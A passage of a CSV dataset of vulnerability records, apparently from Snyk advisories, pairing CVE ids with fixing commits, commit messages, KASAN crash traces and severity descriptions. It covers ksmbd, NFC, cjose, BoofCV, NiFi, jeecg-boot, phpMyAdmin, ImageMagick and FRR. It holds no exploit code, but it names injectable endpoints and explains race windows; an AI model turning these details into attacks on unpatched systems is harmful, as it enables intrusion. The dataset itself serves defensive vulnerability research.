Tested-by: Chih-Yen Chang <cc85nod@gmail.com>
Signed-off-by: Namjae Jeon <linkinjeon@kernel.org>
Signed-off-by: Steve French <stfrench@microsoft.com>",C/C++,8.2,high,Affected versions of this package are vulnerable to Out-of-bounds Read in the deassemble_neg_contexts method.,2023
CVE-2023-38431,CWE-125,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5798560,21/07/2023,21/07/2023,https://github.com/torvalds/linux/commit/368ba06881c395f1c9a7ba22203cf8d78b4addc0,Out-of-bounds Read,https://api.github.com/repos/torvalds/linux/commits/368ba06881c395f1c9a7ba22203cf8d78b4addc0,Namjae Jeon,linkinjeon@kernel.org,linux,368ba06881c395f1c9a7ba22203cf8d78b4addc0,"ksmbd: check the validation of pdu_size in ksmbd_conn_handler_loop

The length field of netbios header must be greater than the SMB header
sizes(smb1 or smb2 header), otherwise the packet is an invalid SMB packet.

If `pdu_size` is 0, ksmbd allocates a 4 bytes chunk to `conn->request_buf`.
In the function `get_smb2_cmd_val` ksmbd will read cmd from
`rcv_hdr->Command`, which is `conn->request_buf + 12`, causing the KASAN
detector to print the following error message:

[    7.205018] BUG: KASAN: slab-out-of-bounds in get_smb2_cmd_val+0x45/0x60
[    7.205423] Read of size 2 at addr ffff8880062d8b50 by task ksmbd:42632/248
...
[    7.207125]  <TASK>
[    7.209191]  get_smb2_cmd_val+0x45/0x60
[    7.209426]  ksmbd_conn_enqueue_request+0x3a/0x100
[    7.209712]  ksmbd_server_process_request+0x72/0x160
[    7.210295]  ksmbd_conn_handler_loop+0x30c/0x550
[    7.212280]  kthread+0x160/0x190
[    7.212762]  ret_from_fork+0x1f/0x30
[    7.212981]  </TASK>

Cc: stable@vger.kernel.org
Reported-by: Chih-Yen Chang <cc85nod@gmail.com>
Signed-off-by: Namjae Jeon <linkinjeon@kernel.org>
Signed-off-by: Steve French <stfrench@microsoft.com>",C/C++,8.2,high,"Affected versions of this package are vulnerable to Out-of-bounds Read due to not validating the relationship between the NetBIOS header's length field and the SMB header sizes, via pdu_size in ksmbd_conn_handler_loop.",2023
CVE-2023-38426,CWE-125,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5798558,21/07/2023,21/07/2023,https://github.com/torvalds/linux/commit/02f76c401d17e409ed45bf7887148fcc22c93c85,Out-of-bounds Read,https://api.github.com/repos/torvalds/linux/commits/02f76c401d17e409ed45bf7887148fcc22c93c85,Chih-Yen Chang,cc85nod@gmail.com,linux,02f76c401d17e409ed45bf7887148fcc22c93c85,"ksmbd: fix global-out-of-bounds in smb2_find_context_vals

Add tag_len argument in smb2_find_context_vals() to avoid out-of-bound
read when create_context's name_len is larger than tag length.

[    7.995411] ==================================================================
[    7.995866] BUG: KASAN: global-out-of-bounds in memcmp+0x83/0xa0
[    7.996248] Read of size 8 at addr ffffffff8258d940 by task kworker/0:0/7
...
[    7.998191] Call Trace:
[    7.998358]  <TASK>
[    7.998503]  dump_stack_lvl+0x33/0x50
[    7.998743]  print_report+0xcc/0x620
[    7.999458]  kasan_report+0xae/0xe0
[    7.999895]  kasan_check_range+0x35/0x1b0
[    8.000152]  memcmp+0x83/0xa0
[    8.000347]  smb2_find_context_vals+0xf7/0x1e0
[    8.000635]  smb2_open+0x1df2/0x43a0
[    8.006398]  handle_ksmbd_work+0x274/0x810
[    8.006666]  process_one_work+0x419/0x760
[    8.006922]  worker_thread+0x2a2/0x6f0
[    8.007429]  kthread+0x160/0x190
[    8.007946]  ret_from_fork+0x1f/0x30
[    8.008181]  </TASK>

Cc: stable@vger.kernel.org
Signed-off-by: Chih-Yen Chang <cc85nod@gmail.com>
Acked-by: Namjae Jeon <linkinjeon@kernel.org>
Signed-off-by: Steve French <stfrench@microsoft.com>",C/C++,8.2,high,Affected versions of this package are vulnerable to Out-of-bounds Read in the smb2_find_context_vals method when the create_context's name_len method is larger than the tag length.,2023
CVE-2023-38429,CWE-193,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5798557,21/07/2023,21/07/2023,https://github.com/torvalds/linux/commit/443d61d1fa9faa60ef925513d83742902390100f,Off-by-one Error,https://api.github.com/repos/torvalds/linux/commits/443d61d1fa9faa60ef925513d83742902390100f,Chih-Yen Chang,cc85nod@gmail.com,linux,443d61d1fa9faa60ef925513d83742902390100f,"ksmbd: allocate one more byte for implied bcc[0]

ksmbd_smb2_check_message allows client to return one byte more, so we
need to allocate additional memory in ksmbd_conn_handler_loop to avoid
out-of-bound access.

Cc: stable@vger.kernel.org
Signed-off-by: Chih-Yen Chang <cc85nod@gmail.com>
Acked-by: Namjae Jeon <linkinjeon@kernel.org>
Signed-off-by: Steve French <stfrench@microsoft.com>",C/C++,6.5,medium,Affected versions of this package are vulnerable to Off-by-one Error in the fs/ksmbd/connection.c file in memory allocation (because of ksmbd_smb2_check_message) that may lead to out-of-bounds access.,2023
CVE-2023-38428,CWE-125,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5798556,21/07/2023,21/07/2023,https://github.com/torvalds/linux/commit/f0a96d1aafd8964e1f9955c830a3e5cb3c60a90f,Out-of-bounds Read,https://api.github.com/repos/torvalds/linux/commits/f0a96d1aafd8964e1f9955c830a3e5cb3c60a90f,Chih-Yen Chang,cc85nod@gmail.com,linux,f0a96d1aafd8964e1f9955c830a3e5cb3c60a90f,"ksmbd: fix wrong UserName check in session_user

The offset of UserName is related to the address of security
buffer. To ensure the validaty of UserName, we need to compare name_off
+ name_len with secbuf_len instead of auth_msg_len.

[   27.096243] ==================================================================
[   27.096890] BUG: KASAN: slab-out-of-bounds in smb_strndup_from_utf16+0x188/0x350
[   27.097609] Read of size 2 at addr ffff888005e3b542 by task kworker/0:0/7
...
[   27.099950] Call Trace:
[   27.100194]  <TASK>
[   27.100397]  dump_stack_lvl+0x33/0x50
[   27.100752]  print_report+0xcc/0x620
[   27.102305]  kasan_report+0xae/0xe0
[   27.103072]  kasan_check_range+0x35/0x1b0
[   27.103757]  smb_strndup_from_utf16+0x188/0x350
[   27.105474]  smb2_sess_setup+0xaf8/0x19c0
[   27.107935]  handle_ksmbd_work+0x274/0x810
[   27.108315]  process_one_work+0x419/0x760
[   27.108689]  worker_thread+0x2a2/0x6f0
[   27.109385]  kthread+0x160/0x190
[   27.110129]  ret_from_fork+0x1f/0x30
[   27.110454]  </TASK>

Cc: stable@vger.kernel.org
Signed-off-by: Chih-Yen Chang <cc85nod@gmail.com>
Acked-by: Namjae Jeon <linkinjeon@kernel.org>
Signed-off-by: Steve French <stfrench@microsoft.com>",C/C++,8.2,high,Affected versions of this package are vulnerable to Out-of-bounds Read such that fs/ksmbd/smb2pdu.c in ksmbd does not properly check the UserName value because it does not consider the address of security buffer.,2023
CVE-2023-37464,CWE-327,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-OPENIDCCJOSE-5798554,21/07/2023,14/07/2023,https://github.com/OpenIDC/cjose/commit/7325e9a5e71e2fc0e350487ecac7d84acdf0ed5e,Use of a Broken or Risky Cryptographic Algorithm,https://api.github.com/repos/OpenIDC/cjose/commits/7325e9a5e71e2fc0e350487ecac7d84acdf0ed5e,Hans Zandbelt,hans.zandbelt@openidc.com,cjose,7325e9a5e71e2fc0e350487ecac7d84acdf0ed5e,"use fixed authentication tag length of 16 octets in AES GCM decryption

see: https://github.com/cisco/cjose/issues/125

Signed-off-by: Hans Zandbelt <hans.zandbelt@openidc.com>",C/C++,8.6,high,Affected versions of this package are vulnerable to Use of a Broken or Risky Cryptographic Algorithm. The AES GCM decryption routine incorrectly uses the Tag length from the actual Authentication Tag provided in the JWE. This bug allows an attacker to provide a truncated Authentication Tag and to modify the JWE accordingly.,2023
CVE-2022-47085,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-OSTREEDEVOSTREE-5798553,21/07/2023,21/07/2023,https://github.com/ostreedev/ostree/commit/a4f56459268869f0188607ae2a897d6bf1136208,Denial of Service (DoS),https://api.github.com/repos/ostreedev/ostree/commits/a4f56459268869f0188607ae2a897d6bf1136208,Colin Walters,walters@verbum.org,ostree,a4f56459268869f0188607ae2a897d6bf1136208,"repo: Avoid potential double unwind when writing panic value

Thanks to @shinmao for the report!

Closes: https://github.com/ostreedev/ostree/issues/2775",Unknown,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS) via the print_panic function in the repo_checkout_filter.rs file.,2023
CVE-2023-39010,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGBOOFCV-5810354,30/07/2023,30/07/2023,https://github.com/lessthanoptimal/BoofCV/commit/d167f4d66c895e6536a3d59ff931d1987da3a0a0,Arbitrary Code Injection,https://api.github.com/repos/lessthanoptimal/BoofCV/commits/d167f4d66c895e6536a3d59ff931d1987da3a0a0,Peter Abeles,peter.abeles@gmail.com,BoofCV,d167f4d66c895e6536a3d59ff931d1987da3a0a0,"- Security
  - When de-serializing YAML it now uses Yaml(new SafeConstructor()) to prevent arbitrary code execution
  - Thanks Letian Yuan for the disclosure",Unknown,8.8,high,"org.boofcv:ip is a Java library for real-time computer vision and robotics applications.
Affected versions of this package are vulnerable to Arbitrary Code Injection via the boofcv.io.calibration.CalibrationIO.load() function. An attacker can load a malicious YAML file as a camera calibration config.",2023
CVE-2016-2040,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PHPMYADMINPHPMYADMIN-5810519,30/07/2023,14/05/2022,https://github.com/phpmyadmin/phpmyadmin/commit/75a55824012406a08c4debf5ddb7ae41c32a7dbc,Cross-site Scripting (XSS),https://api.github.com/repos/phpmyadmin/phpmyadmin/commits/75a55824012406a08c4debf5ddb7ae41c32a7dbc,Madhura Jayaratne,madhura.cj@gmail.com,phpmyadmin,75a55824012406a08c4debf5ddb7ae41c32a7dbc,"Fix XSS in DB_search.php

Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",PHP,5.4,medium,"phpmyadmin/phpmyadmin is a web interface for MySQL and MariaDB.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via table name, SET value, search query, or hostname in a Location header.",2023
CVE-2023-36542,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHENIFI-5810345,30/07/2023,30/07/2023,https://github.com/apache/nifi/commit/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,Arbitrary Code Injection,https://api.github.com/repos/apache/nifi/commits/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,exceptionfactory,exceptionfactory@apache.org,nifi,bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,"NIFI-11744 Added Required Permission to Reference Remote Resources

- Applied Required Permission to components supporting URL Resource References

Signed-off-by: Matt Burgess <mattyb149@apache.org>

This closes #7426",Java,7.6,high,Affected versions of this package are vulnerable to Arbitrary Code Injection when retrieving a driver via remote URI. Permissions are not sufficiently checked when allowing users to reference remote resources.,2023
CVE-2023-36542,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHENIFI-5810351,30/07/2023,30/07/2023,https://github.com/apache/nifi/commit/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,Arbitrary Code Injection,https://api.github.com/repos/apache/nifi/commits/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,exceptionfactory,exceptionfactory@apache.org,nifi,bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,"NIFI-11744 Added Required Permission to Reference Remote Resources

- Applied Required Permission to components supporting URL Resource References

Signed-off-by: Matt Burgess <mattyb149@apache.org>

This closes #7426",Java,7.6,high,Affected versions of this package are vulnerable to Arbitrary Code Injection when retrieving a driver via remote URI. Permissions are not sufficiently checked when allowing users to reference remote resources.,2023
CVE-2023-36542,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHENIFI-5810350,30/07/2023,30/07/2023,https://github.com/apache/nifi/commit/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,Arbitrary Code Injection,https://api.github.com/repos/apache/nifi/commits/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,exceptionfactory,exceptionfactory@apache.org,nifi,bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,"NIFI-11744 Added Required Permission to Reference Remote Resources

- Applied Required Permission to components supporting URL Resource References

Signed-off-by: Matt Burgess <mattyb149@apache.org>

This closes #7426",Java,7.6,high,Affected versions of this package are vulnerable to Arbitrary Code Injection when retrieving a driver via remote URI. Permissions are not sufficiently checked when allowing users to reference remote resources.,2023
CVE-2023-36542,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHENIFI-5810347,30/07/2023,30/07/2023,https://github.com/apache/nifi/commit/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,Arbitrary Code Injection,https://api.github.com/repos/apache/nifi/commits/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,exceptionfactory,exceptionfactory@apache.org,nifi,bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,"NIFI-11744 Added Required Permission to Reference Remote Resources

- Applied Required Permission to components supporting URL Resource References

Signed-off-by: Matt Burgess <mattyb149@apache.org>

This closes #7426",Java,7.6,high,"org.apache.nifi:nifi-standard-processors is a powerful, and reliable system to process and distribute data
Affected versions of this package are vulnerable to Arbitrary Code Injection when retrieving a driver via remote URI. Permissions are not sufficiently checked when allowing users to reference remote resources.",2023
CVE-2023-36542,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHENIFI-5810344,30/07/2023,30/07/2023,https://github.com/apache/nifi/commit/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,Arbitrary Code Injection,https://api.github.com/repos/apache/nifi/commits/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,exceptionfactory,exceptionfactory@apache.org,nifi,bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,"NIFI-11744 Added Required Permission to Reference Remote Resources

- Applied Required Permission to components supporting URL Resource References

Signed-off-by: Matt Burgess <mattyb149@apache.org>

This closes #7426",Java,7.6,high,Affected versions of this package are vulnerable to Arbitrary Code Injection when retrieving a driver via remote URI. Permissions are not sufficiently checked when allowing users to reference remote resources.,2023
CVE-2023-36542,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHENIFI-5810349,30/07/2023,30/07/2023,https://github.com/apache/nifi/commit/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,Arbitrary Code Injection,https://api.github.com/repos/apache/nifi/commits/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,exceptionfactory,exceptionfactory@apache.org,nifi,bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,"NIFI-11744 Added Required Permission to Reference Remote Resources

- Applied Required Permission to components supporting URL Resource References

Signed-off-by: Matt Burgess <mattyb149@apache.org>

This closes #7426",Java,7.6,high,Affected versions of this package are vulnerable to Arbitrary Code Injection when retrieving a driver via remote URI. Permissions are not sufficiently checked when allowing users to reference remote resources.,2023
CVE-2023-36542,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHENIFI-5810346,30/07/2023,30/07/2023,https://github.com/apache/nifi/commit/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,Arbitrary Code Injection,https://api.github.com/repos/apache/nifi/commits/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,exceptionfactory,exceptionfactory@apache.org,nifi,bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,"NIFI-11744 Added Required Permission to Reference Remote Resources

- Applied Required Permission to components supporting URL Resource References

Signed-off-by: Matt Burgess <mattyb149@apache.org>

This closes #7426",Java,7.6,high,"org.apache.nifi:nifi-jms-processors is a NiFi JMS Processors.
Affected versions of this package are vulnerable to Arbitrary Code Injection when retrieving a driver via remote URI. Permissions are not sufficiently checked when allowing users to reference remote resources.",2023
CVE-2023-36542,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHENIFI-5810348,30/07/2023,30/07/2023,https://github.com/apache/nifi/commit/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,Arbitrary Code Injection,https://api.github.com/repos/apache/nifi/commits/bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,exceptionfactory,exceptionfactory@apache.org,nifi,bdd7ef3671cfccf75e1fa1aaff867d2e35c68c85,"NIFI-11744 Added Required Permission to Reference Remote Resources

- Applied Required Permission to components supporting URL Resource References

Signed-off-by: Matt Burgess <mattyb149@apache.org>

This closes #7426",Java,7.6,high,Affected versions of this package are vulnerable to Arbitrary Code Injection when retrieving a driver via remote URI. Permissions are not sufficiently checked when allowing users to reference remote resources.,2023
CVE-2023-38992,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGJEECGFRAMEWORKBOOT-5810355,30/07/2023,30/07/2023,https://github.com/jeecgboot/jeecg-boot/commit/648e66d5ef1547a01ff77bf9875f960ca39bbe8e,SQL Injection,https://api.github.com/repos/jeecgboot/jeecg-boot/commits/648e66d5ef1547a01ff77bf9875f960ca39bbe8e,zhangdaiscott,zhangdaiscott@163.com,jeecg-boot,648e66d5ef1547a01ff77bf9875f960ca39bbe8e,SQL注入 #5173,Java,8.8,high,"org.jeecgframework.boot:jeecg-boot-parent is a low-code development platform.
Affected versions of this package are vulnerable to SQL Injection in the loadTreeData() function in SysDictController, exploitable via the title parameter at the /sys/dict/loadTreeData endpoint.",2023
CVE-2023-3745,CWE-122,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-IMAGEMAGICKIMAGEMAGICK-5808492,28/07/2023,28/07/2023,https://github.com/ImageMagick/ImageMagick6/commit/7486477aa00c5c7856b111506da075b6cdfa8b73,Heap-based Buffer Overflow,https://api.github.com/repos/ImageMagick/ImageMagick6/commits/7486477aa00c5c7856b111506da075b6cdfa8b73,Cristy,mikayla-grace@urban-warrior.org,ImageMagick6,7486477aa00c5c7856b111506da075b6cdfa8b73,https://github.com/ImageMagick/ImageMagick/issues/1857,C/C++,5.5,medium,"Affected versions of this package are vulnerable to Heap-based Buffer Overflow in the PushCharPixel() function at the quantum-private.h file. This issue may allow a local attacker to trick the user into opening a specially crafted file, triggering an out-of-bounds read error and allowing an application to crash, resulting in a denial of service.",2023
CVE-2023-3863,CWE-416,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5808495,28/07/2023,25/06/2023,https://github.com/torvalds/linux/commit/6709d4b7bc2e079241fdef15d1160581c5261c10,Use After Free,https://api.github.com/repos/torvalds/linux/commits/6709d4b7bc2e079241fdef15d1160581c5261c10,Lin Ma,linma@zju.edu.cn,linux,6709d4b7bc2e079241fdef15d1160581c5261c10,"net: nfc: Fix use-after-free caused by nfc_llcp_find_local

This commit fixes several use-after-free that caused by function
nfc_llcp_find_local(). For example, one UAF can happen when below buggy
time window occurs.

// nfc_genl_llc_get_params   | // nfc_unregister_device
                             |
dev = nfc_get_device(idx);   | device_lock(...)
if (!dev)                    | dev->shutting_down = true;
    return -ENODEV;          | device_unlock(...);
                             |
device_lock(...);            |   // nfc_llcp_unregister_device
                             |   nfc_llcp_find_local()
nfc_llcp_find_local(...);    |
                             |   local_cleanup()
if (!local) {                |
    rc = -ENODEV;            |     // nfc_llcp_local_put
    goto exit;               |     kref_put(.., local_release)
}                            |
                             |       // local_release
                             |       list_del(&local->list)
  // nfc_genl_send_params    |       kfree()
  local->dev->idx !!!UAF!!!  |
                             |

and the crash trace for the one of the discussed UAF like:

BUG: KASAN: slab-use-after-free in nfc_genl_llc_get_params+0x72f/0x780  net/nfc/netlink.c:1045
Read of size 8 at addr ffff888105b0e410 by task 20114

Call Trace:
 <TASK>
 __dump_stack  lib/dump_stack.c:88 [inline]
 dump_stack_lvl+0x72/0xa0  lib/dump_stack.c:106
 print_address_description  mm/kasan/report.c:319 [inline]
 print_report+0xcc/0x620  mm/kasan/report.c:430
 kasan_report+0xb2/0xe0  mm/kasan/report.c:536
 nfc_genl_send_params  net/nfc/netlink.c:999 [inline]
 nfc_genl_llc_get_params+0x72f/0x780  net/nfc/netlink.c:1045
 genl_family_rcv_msg_doit.isra.0+0x1ee/0x2e0  net/netlink/genetlink.c:968
 genl_family_rcv_msg  net/netlink/genetlink.c:1048 [inline]
 genl_rcv_msg+0x503/0x7d0  net/netlink/genetlink.c:1065
 netlink_rcv_skb+0x161/0x430  net/netlink/af_netlink.c:2548
 genl_rcv+0x28/0x40  net/netlink/genetlink.c:1076
 netlink_unicast_kernel  net/netlink/af_netlink.c:1339 [inline]
 netlink_unicast+0x644/0x900  net/netlink/af_netlink.c:1365
 netlink_sendmsg+0x934/0xe70  net/netlink/af_netlink.c:1913
 sock_sendmsg_nosec  net/socket.c:724 [inline]
 sock_sendmsg+0x1b6/0x200  net/socket.c:747
 ____sys_sendmsg+0x6e9/0x890  net/socket.c:2501
 ___sys_sendmsg+0x110/0x1b0  net/socket.c:2555
 __sys_sendmsg+0xf7/0x1d0  net/socket.c:2584
 do_syscall_x64  arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3f/0x90  arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7f34640a2389
RSP: 002b:00007f3463415168 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007f34641c1f80 RCX: 00007f34640a2389
RDX: 0000000000000000 RSI: 0000000020000240 RDI: 0000000000000006
RBP: 00007f34640ed493 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 00007ffe38449ecf R14: 00007f3463415300 R15: 0000000000022000
 </TASK>

Allocated by task 20116:
 kasan_save_stack+0x22/0x50  mm/kasan/common.c:45
 kasan_set_track+0x25/0x30  mm/kasan/common.c:52
 ____kasan_kmalloc  mm/kasan/common.c:374 [inline]
 __kasan_kmalloc+0x7f/0x90  mm/kasan/common.c:383
 kmalloc  include/linux/slab.h:580 [inline]
 kzalloc  include/linux/slab.h:720 [inline]
 nfc_llcp_register_device+0x49/0xa40  net/nfc/llcp_core.c:1567
 nfc_register_device+0x61/0x260  net/nfc/core.c:1124
 nci_register_device+0x776/0xb20  net/nfc/nci/core.c:1257
 virtual_ncidev_open+0x147/0x230  drivers/nfc/virtual_ncidev.c:148
 misc_open+0x379/0x4a0  drivers/char/misc.c:165
 chrdev_open+0x26c/0x780  fs/char_dev.c:414
 do_dentry_open+0x6c4/0x12a0  fs/open.c:920
 do_open  fs/namei.c:3560 [inline]
 path_openat+0x24fe/0x37e0  fs/namei.c:3715
 do_filp_open+0x1ba/0x410  fs/namei.c:3742
 do_sys_openat2+0x171/0x4c0  fs/open.c:1356
 do_sys_open  fs/open.c:1372 [inline]
 __do_sys_openat  fs/open.c:1388 [inline]
 __se_sys_openat  fs/open.c:1383 [inline]
 __x64_sys_openat+0x143/0x200  fs/open.c:1383
 do_syscall_x64  arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3f/0x90  arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc

Freed by task 20115:
 kasan_save_stack+0x22/0x50  mm/kasan/common.c:45
 kasan_set_track+0x25/0x30  mm/kasan/common.c:52
 kasan_save_free_info+0x2e/0x50  mm/kasan/generic.c:521
 ____kasan_slab_free  mm/kasan/common.c:236 [inline]
 ____kasan_slab_free  mm/kasan/common.c:200 [inline]
 __kasan_slab_free+0x10a/0x190  mm/kasan/common.c:244
 kasan_slab_free  include/linux/kasan.h:162 [inline]
 slab_free_hook  mm/slub.c:1781 [inline]
 slab_free_freelist_hook  mm/slub.c:1807 [inline]
 slab_free  mm/slub.c:3787 [inline]
 __kmem_cache_free+0x7a/0x190  mm/slub.c:3800
 local_release  net/nfc/llcp_core.c:174 [inline]
 kref_put  include/linux/kref.h:65 [inline]
 nfc_llcp_local_put  net/nfc/llcp_core.c:182 [inline]
 nfc_llcp_local_put  net/nfc/llcp_core.c:177 [inline]
 nfc_llcp_unregister_device+0x206/0x290  net/nfc/llcp_core.c:1620
 nfc_unregister_device+0x160/0x1d0  net/nfc/core.c:1179
 virtual_ncidev_close+0x52/0xa0  drivers/nfc/virtual_ncidev.c:163
 __fput+0x252/0xa20  fs/file_table.c:321
 task_work_run+0x174/0x270  kernel/task_work.c:179
 resume_user_mode_work  include/linux/resume_user_mode.h:49 [inline]
 exit_to_user_mode_loop  kernel/entry/common.c:171 [inline]
 exit_to_user_mode_prepare+0x108/0x110  kernel/entry/common.c:204
 __syscall_exit_to_user_mode_work  kernel/entry/common.c:286 [inline]
 syscall_exit_to_user_mode+0x21/0x50  kernel/entry/common.c:297
 do_syscall_64+0x4c/0x90  arch/x86/entry/common.c:86
 entry_SYSCALL_64_after_hwframe+0x72/0xdc

Last potentially related work creation:
 kasan_save_stack+0x22/0x50  mm/kasan/common.c:45
 __kasan_record_aux_stack+0x95/0xb0  mm/kasan/generic.c:491
 kvfree_call_rcu+0x29/0xa80  kernel/rcu/tree.c:3328
 drop_sysctl_table+0x3be/0x4e0  fs/proc/proc_sysctl.c:1735
 unregister_sysctl_table.part.0+0x9c/0x190  fs/proc/proc_sysctl.c:1773
 unregister_sysctl_table+0x24/0x30  fs/proc/proc_sysctl.c:1753
 neigh_sysctl_unregister+0x5f/0x80  net/core/neighbour.c:3895
 addrconf_notify+0x140/0x17b0  net/ipv6/addrconf.c:3684
 notifier_call_chain+0xbe/0x210  kernel/notifier.c:87
 call_netdevice_notifiers_info+0xb5/0x150  net/core/dev.c:1937
 call_netdevice_notifiers_extack  net/core/dev.c:1975 [inline]
 call_netdevice_notifiers  net/core/dev.c:1989 [inline]
 dev_change_name+0x3c3/0x870  net/core/dev.c:1211
 dev_ifsioc+0x800/0xf70  net/core/dev_ioctl.c:376
 dev_ioctl+0x3d9/0xf80  net/core/dev_ioctl.c:542
 sock_do_ioctl+0x160/0x260  net/socket.c:1213
 sock_ioctl+0x3f9/0x670  net/socket.c:1316
 vfs_ioctl  fs/ioctl.c:51 [inline]
 __do_sys_ioctl  fs/ioctl.c:870 [inline]
 __se_sys_ioctl  fs/ioctl.c:856 [inline]
 __x64_sys_ioctl+0x19e/0x210  fs/ioctl.c:856
 do_syscall_x64  arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3f/0x90  arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc

The buggy address belongs to the object at ffff888105b0e400
 which belongs to the cache kmalloc-1k of size 1024
The buggy address is located 16 bytes inside of
 freed 1024-byte region [ffff888105b0e400, ffff888105b0e800)

The buggy address belongs to the physical page:
head:ffffea000416c200 order:3 entire_mapcount:0 nr_pages_mapped:0 pincount:0
flags: 0x200000000010200(slab|head|node=0|zone=2)
raw: 0200000000010200 ffff8881000430c0 ffffea00044c7010 ffffea0004510e10
raw: 0000000000000000 00000000000a000a 00000001ffffffff 0000000000000000
page dumped because: kasan: bad access detected

Memory state around the buggy address:
 ffff888105b0e300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
 ffff888105b0e380: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
>ffff888105b0e400: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
                         ^
 ffff888105b0e480: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
 ffff888105b0e500: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb

In summary, this patch solves those use-after-free by

1. Re-implement the nfc_llcp_find_local(). The current version does not
grab the reference when getting the local from the linked list.  For
example, the llcp_sock_bind() gets the reference like below:

// llcp_sock_bind()

    local = nfc_llcp_find_local(dev); // A
    ..... \
           | raceable
    ..... /
    llcp_sock->local = nfc_llcp_local_get(local); // B

There is an apparent race window that one can  drop the reference
and free the local object fetched in (A) before (B) gets the reference.

2. Some callers of the nfc_llcp_find_local() do not grab the reference
at all. For example, the nfc_genl_llc_{{get/set}_params/sdreq} functions.
We add the nfc_llcp_local_put() for them. Moreover, we add the necessary
error handling function to put the reference.

3. Add the nfc_llcp_remove_local() helper. The local object is removed
from the linked list in local_release() when all reference is gone. This
patch removes it when nfc_llcp_unregister_device() is called.

Therefore, every caller of nfc_llcp_find_local() will get a reference
even when the nfc_llcp_unregister_device() is called. This promises no
use-after-free for the local object is ever possible.

Fixes: 52feb444a903 (""NFC: Extend netlink interface for LTO, RW, and MIUX parameters support"")
Fixes: c7aa12252f51 (""NFC: Take a reference on the LLCP local pointer when creating a socket"")
Signed-off-by: Lin Ma <linma@zju.edu.cn>
Reviewed-by: Simon Horman <simon.horman@corigine.com>
Signed-off-by: David S. Miller <davem@davemloft.net>",C/C++,6.4,medium,Affected versions of this package are vulnerable to Use After Free in the nfc_llcp_find_loca method at the net/nfc/llcp_core.c file.,2023
CVE-2023-3748,CWE-835,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-FRROUTINGFRR-5808488,28/07/2023,28/07/2023,https://github.com/FRRouting/frr/commit/0a95d121ca8e1f43d41d952d6c82d111ca850085,Infinite loop,https://api.github.com/repos/FRRouting/frr/commits/0a95d121ca8e1f43d41d952d6c82d111ca850085,harryreps,harryreps@gmail.com,frr,0a95d121ca8e1f43d41d952d6c82d111ca850085,"babeld: fix #11808 to avoid infinite loops

Replacing continue in loops to goto done so that index of packet buffer
increases.

Signed-off-by: harryreps <harryreps@gmail.com>
(cherry picked from commit ae1e0e1fed77716bc06f181ad68c4433fb5523d0)",C/C++,3.5,low,"Affected versions of this package are vulnerable to Infinite loop when parsing certain babeld unicast hello messages that are intended to be ignored. This issue may allow an attacker to send specially crafted hello messages with the unicast flag set, the interval field set to 0, or any TLV that contains a sub-TLV with the Mandatory flag set to enter an infinite loop and cause a denial of service.",2023
